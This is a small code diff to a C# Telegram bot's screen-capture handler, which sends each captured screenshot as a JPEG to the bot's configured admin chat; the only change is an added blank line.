@@ -19,6 +19,7 @@ namespace Telebot.ScreenCapture
         private async void ScreenCaptured(object sender, ScreenCaptureArgs e)
         {
             var document = new InputOnlineFile(e.Capture.ToStream(), "captime.jpg");
+
             await client.SendDocumentAsync(client.AdminID, document, thumb: document as InputMedia);
         }
     }
